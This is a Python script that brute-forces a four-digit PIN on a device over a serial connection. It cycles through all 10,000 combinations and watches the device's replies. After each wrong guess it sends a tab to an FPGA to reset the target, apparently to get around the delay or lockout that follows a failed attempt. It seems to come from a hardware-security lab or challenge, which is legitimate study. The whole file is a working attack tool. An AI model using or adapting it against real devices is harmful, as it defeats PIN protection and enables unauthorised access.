import sys
import serial
import string
import itertools


#Args
if len(sys.argv) == 2:
	ser = serial.Serial(sys.argv[1])
else :
	print ('Please specify serial port :)')
	exit()
	
#serial__init
ser.baudrate = 115200
encoding = 'utf-8'
dev_response=' '
print(ser.name)        
if not ser.isOpen():
	ser.open()

#Brute force dictionary
asci_list = string.digits
pin_length = 4

for pin in itertools.product(asci_list, repeat=pin_length): 
	pin = ''.join(pin)
	
        #waiting for reponse from Dev 
	while ser.inWaiting() == 0:
		ser.flush()
		
	#Get response from Dev	
	while ser.inWaiting() > 0:
		dev_response +=ser.read(4).decode(encoding)
		ser.flush() #flush contents of buffer
			
	#print(dev_response) #see response on screen	
	
	#handle delay after pin is incorrect
	if "PIN is incorrect." in dev_response  :
		#print(".")
		char_in ='	'  #send tab to FPGA to reset the target
		ser.write(bytes(char_in,'ascii'))
		#ser.write(bytes(char_in,'ascii')) #just to make sure
		ser.flush() #flush contents of buffer
	
	elif "Please enter the PIN:" in dev_response :
		x=0
		#print(';')
		
	else :
		print("Correct pin is: " + pin +"!!!") 
		exit()
		
	dev_response=''     #clear response
	
	#Send to Dev
	pin_attempt = pin
	print("sending pin_attempt:" + pin_attempt)
	ser.write(bytes(pin_attempt,'ascii'))
	ser.flush() #flush contents of buffer
	
	

	
#	ser.close()
#	exit()
		
